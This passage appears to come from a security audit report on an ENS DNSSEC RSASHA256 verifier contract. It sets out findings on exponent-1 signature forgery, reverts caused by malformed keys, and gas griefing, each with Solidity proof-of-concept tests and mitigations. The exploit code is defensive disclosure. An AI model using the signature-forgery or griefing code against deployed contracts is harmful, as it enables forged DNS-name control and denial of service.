        try verifier.verify(malformedKey, bytes("dnssec rrset"), hex"01") returns (bool ok) {
            result = ok;
        } catch {
            reverted = true;
        }

        assertEq(reverted, true, "malformed key should currently revert");
        assertEq(result, false, "invalid proofs should be rejected with false instead");
    }

    function testMalformedLongExponentKeyRevertsInsteadOfReturningFalse() public {
        bytes memory malformedKey = hex"0000000000ff";
        bool reverted;
        bool result;

        try verifier.verify(malformedKey, bytes("dnssec rrset"), hex"01") returns (bool ok) {
            result = ok;
        } catch {
            reverted = true;
        }

        assertEq(reverted, true, "malformed long-form exponent key should currently revert");
        assertEq(result, false, "invalid proofs should be rejected with false instead");
    }
}

## Suggested Mitigation
Validate the DNSKEY byte layout before slicing or subtracting lengths, and return false for malformed keys. Require key.length >= 5 before readUint8(4); for short-form exponents require exponentLen > 0 and key.length >= 5 + exponentLen + minimumModulusLength; for long-form exponents require key.length >= 7, exponentLen > 0, and key.length >= 7 + exponentLen + minimumModulusLength. Avoid evaluating `key.length - exponentLen - offset` until after the corresponding upper-bound check passes. Also harden RSAPKCS1Verify.recoverAndVerify with minimum recovered block length checks before indexing result[0], result[1], or subtracting digest/hash lengths.
```

### H-21 / `Ovl2IoLGc0ESEgrGyixaa`
- Finding title: RSASHA256Algorithm.verify accepts forged signatures when DNSKEY exponent is 1
- Report lines: 1712-1794
```md
## [H-21]. RSASHA256Algorithm.verify accepts forged signatures when DNSKEY exponent is 1

## id: Ovl2IoLGc0ESEgrGyixaa

## Derived From Pattern/Invariant
StandardViolation: RSA/DNSSEC verifier accepts nontrivial invalid public exponent

## Exploit Type
StandardViolation

## Location
RSASHA256Algorithm.verify

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 2
## Minimim Privilege Required:Permissionless


## Description
The verifier parses the RSA public exponent from attacker-supplied DNSKEY bytes but never rejects exponent == 1. RSA verification computes sig^exponent mod modulus; with exponent 1, the recovered block is simply sig. An attacker can therefore set sig directly to a correctly encoded PKCS#1 v1.5 SHA256 block for the chosen data and make verify return true without knowing any private key.

Vulnerable snippet:
uint16 exponentLen = uint16(key.readUint8(4));
exponent = key.substring(5, exponentLen);
modulus = key.substring(exponentLen + 5, key.length - exponentLen - 5);
return RSAPKCS1Verify.verifySHA256(modulus, exponent, sig, sha256(data));

No check enforces exponent > 1 and odd before RSAVerify.rsarecover calls the modexp precompile.

## Impact
Cryptographic authentication bypass for the RSASHA256 algorithm contract. Any protocol path that relies on this verifier to reject forged RSA/DNSSEC signatures can accept attacker-created signatures for keys using exponent 1, enabling unauthorized DNSSEC proof acceptance and downstream ENS DNS-name control changes.

## Proof of Concept
1. Build DNSKEY RDATA with algorithm byte 8, exponent length 1, exponent 0x01, and a modulus larger than the crafted encoded message.
2. Compute sha256(data).
3. Construct the PKCS#1 v1.5 encoded message block: 0x00 || 0x01 || 0xff padding || 0x00 || SHA256 DigestInfo || hash.
4. Submit that encoded block itself as sig.
5. Because exponent is 1, modexp returns sig unchanged, all PKCS#1 checks pass, and verify returns true without a private key.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../contracts/dnssec-oracle/algorithms/RSASHA256Algorithm.sol";

contract RSASHA256ExponentOnePoC is Test {
    RSASHA256Algorithm alg;

    function setUp() public {
        alg = new RSASHA256Algorithm();
    }

    function testExponentOneAllowsForgedSignature() public {
        bytes memory data = bytes("attacker controlled rrset");
        bytes memory modulus = new bytes(128);
        for (uint256 i; i < modulus.length; i++) modulus[i] = 0xff;

        bytes memory forgedSig = _encodedMessage(data);
        bytes memory key = bytes.concat(bytes4(0x00000008), bytes1(uint8(1)), bytes1(uint8(1)), modulus);

        assertTrue(alg.verify(key, data, forgedSig));
    }

    function _encodedMessage(bytes memory data) internal pure returns (bytes memory em) {
        bytes memory digestInfo = hex"3031300d060960864801650304020105000420";
        bytes32 h = sha256(data);
        em = new bytes(128);
        em[0] = 0x00;
        em[1] = 0x01;
        for (uint256 i = 2; i < 76; i++) em[i] = 0xff;
        em[76] = 0x00;
        for (uint256 i; i < digestInfo.length; i++) em[77 + i] = digestInfo[i];
        for (uint256 i; i < 32; i++) em[96 + i] = h[i];
    }
}


## Suggested Mitigation
Reject invalid RSA public exponents before calling modexp. Decode exponent as an integer and require it to be odd and greater than 1; preferably enforce common DNSSEC RSA bounds such as 3 or 65537 and reject empty or oversized exponent encodings.
```

### M-22 / `AyWIZjZJ3bf1WXvDs4EXH`
- Finding title: Malformed RSA key material makes RSASHA256Algorithm.verify revert instead of returning false
- Report lines: 1795-1879
```md
## [M-22]. Malformed RSA key material makes RSASHA256Algorithm.verify revert instead of returning false

## id: AyWIZjZJ3bf1WXvDs4EXH

## Derived From Pattern/Invariant
StandardViolation: malformed signature inputs must fail closed instead of reverting

## Exploit Type
Dos

## Location
RSASHA256Algorithm.verify

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 1
## Minimim Privilege Required:Permissionless


## Description
Algorithm.verify is a boolean signature predicate, but malformed attacker-controlled DNSSEC proof bytes can revert before the function returns false. The parser reads fixed offsets and computes substring lengths without first validating key length or exponent/modulus boundaries. RSAPKCS1Verify then indexes result[0]/result[1] and subtracts digest/hash lengths before proving the modulus is large enough for a SHA256 PKCS#1 block.

Vulnerable snippets:
uint16 exponentLen = uint16(key.readUint8(4));
exponent = key.substring(5, exponentLen);
modulus = key.substring(exponentLen + 5, key.length - exponentLen - 5);

if (result[0] != 0x00 || result[1] != 0x01) {
    return (false, result);
}
uint256 hashStart = result.length - hashLen;
uint256 digestInfoStart = hashStart - digestInfo.length;

For key.length < 5, inconsistent exponent lengths, or too-short moduli, these operations revert with bounds errors, out-of-bounds indexing, or arithmetic underflow.

## Impact
A malicious or malformed DNSSEC proof can abort the caller instead of being classified as an invalid proof. In upstream proof-processing flows, this creates a permissionless griefing/DoS vector against operations that should safely reject invalid RSASHA256 material.

## Proof of Concept
1. Call verify with key shorter than five bytes.
2. The function attempts key.readUint8(4), which reverts instead of returning false.
3. Alternatively, pass a one-byte modulus that causes modexp output length one; result[0] is zero and result[1] indexing reverts.
4. The invalid proof aborts the transaction rather than producing a false verification result.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../contracts/dnssec-oracle/algorithms/RSASHA256Algorithm.sol";

contract RSASHA256MalformedInputPoC is Test {
    function testShortKeyRevertsInsteadOfReturningFalse() public {
        RSASHA256Algorithm alg = new RSASHA256Algorithm();

        bool reverted;
        try alg.verify(hex"00010203", bytes("data"), hex"00") returns (bool ok) {
            assertEq(ok, false);
        } catch {
            reverted = true;
        }

        assertEq(reverted, true);
    }

    function testShortModulusRevertsInsteadOfReturningFalse() public {
        RSASHA256Algorithm alg = new RSASHA256Algorithm();
        bytes memory key = bytes.concat(bytes4(0x00000008), bytes1(uint8(1)), bytes1(uint8(1)), bytes1(uint8(1)));

        bool reverted;
        try alg.verify(key, bytes("data"), hex"00") returns (bool ok) {
            assertEq(ok, false);
        } catch {
            reverted = true;
        }

        assertEq(reverted, true);
    }
}


## Suggested Mitigation
Validate all attacker-controlled lengths before slicing or indexing: require key.length >= 5, require extended exponent encodings have at least 7 bytes, require exponentLen is nonzero and does not exceed the remaining key bytes, require modulus.length is at least 62 bytes for SHA256 PKCS#1 v1.5, and return false rather than reverting for malformed proof material.
```

### M-23 / `fkK11fgPckx9ByS1Icpau`
- Finding title: Unbounded RSA key and signature sizes allow gas griefing through RSASHA256Algorithm.verify
- Report lines: 1880-1966
```md
## [M-23]. Unbounded RSA key and signature sizes allow gas griefing through RSASHA256Algorithm.verify

## id: fkK11fgPckx9ByS1Icpau

## Derived From Pattern/Invariant
UnboundedLoops: attacker-controlled byte lengths drive memory copying and modexp gas

## Exploit Type
GasGriefBlockLimit

## Location
RSASHA256Algorithm.verify

## Finding Status: Valid
### Finding Status Justification: 
### Finding Complexity: 1
## Minimim Privilege Required:Permissionless


## Description
The verifier imposes no maximum on key, exponent, modulus, or signature length. Attacker-controlled bytes are copied into memory by substring, packed into the modexp input, and then forwarded to precompile 0x05 with gas(). Large modulus/exponent/signature values therefore let a caller force very high gas consumption in any upstream function that invokes RSASHA256Algorithm.verify on untrusted DNSSEC proof material.

Vulnerable snippets:
exponent = key.substring(7, exponentLen);
modulus = key.substring(exponentLen + 7, key.length - exponentLen - 7);

bytes memory input = abi.encodePacked(uint256(base.length), uint256(exponent.length), uint256(modulus.length), base, exponent, modulus);
output = new bytes(modulus.length);
success := staticcall(gas(), 5, add(input, 32), mload(input), add(output, 32), mload(modulus))

Because all remaining gas is forwarded and no DNSSEC RSA size bound is enforced, the cost scales with attacker-supplied proof length.

## Impact
Permissionless gas griefing and potential block-gas-limit DoS against DNSSEC verification flows. This matches the in-scope medium impacts for griefing, theft of gas, and unbounded gas consumption.

## Proof of Concept
1. Construct an extended-exponent DNSKEY where key[4] is zero and the uint16 exponent length is large.
2. Fill exponent, modulus, and signature bytes with attacker-controlled data.
3. Submit the proof to any caller that invokes RSASHA256Algorithm.verify.
4. The verifier performs large memory copies and forwards all remaining gas into the modexp precompile before returning false or reverting.
5. Increasing input sizes monotonically increases gas, allowing the attacker to tune the transaction toward block-gas exhaustion.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../contracts/dnssec-oracle/algorithms/RSASHA256Algorithm.sol";

contract RSASHA256GasGriefPoC is Test {
    RSASHA256Algorithm alg;

    function setUp() public {
        alg = new RSASHA256Algorithm();
    }

    function testOversizedInputsConsumeDisproportionateGas() public {
        uint256 smallGas = _gasForVerify(1, 256);
        uint256 largeGas = _gasForVerify(512, 4096);
        assertGt(largeGas, smallGas * 4);
    }

    function _gasForVerify(uint16 exponentLen, uint256 modulusLen) internal returns (uint256) {
        bytes memory key = _extendedKey(exponentLen, modulusLen);
        bytes memory sig = new bytes(modulusLen);
        uint256 beforeGas = gasleft();
        try alg.verify(key, bytes("x"), sig) returns (bool) {} catch {}
        return beforeGas - gasleft();
    }

    function _extendedKey(uint16 exponentLen, uint256 modulusLen) internal pure returns (bytes memory key) {
        key = new bytes(7 + uint256(exponentLen) + modulusLen);
        key[3] = 0x08;
        key[4] = 0x00;
        key[5] = bytes1(uint8(exponentLen >> 8));
        key[6] = bytes1(uint8(exponentLen));
        for (uint256 i; i < exponentLen; i++) key[7 + i] = 0xff;
        for (uint256 i; i < modulusLen; i++) key[7 + uint256(exponentLen) + i] = 0xff;
    }
}


## Suggested Mitigation
Enforce protocol-supported DNSSEC RSA bounds before any substring copying or modexp call. Reject oversized key, exponent, modulus, and signature lengths; require sig.length == modulus.length; and call the precompile with a bounded gas stipend or precomputed maximum-cost checks.
```
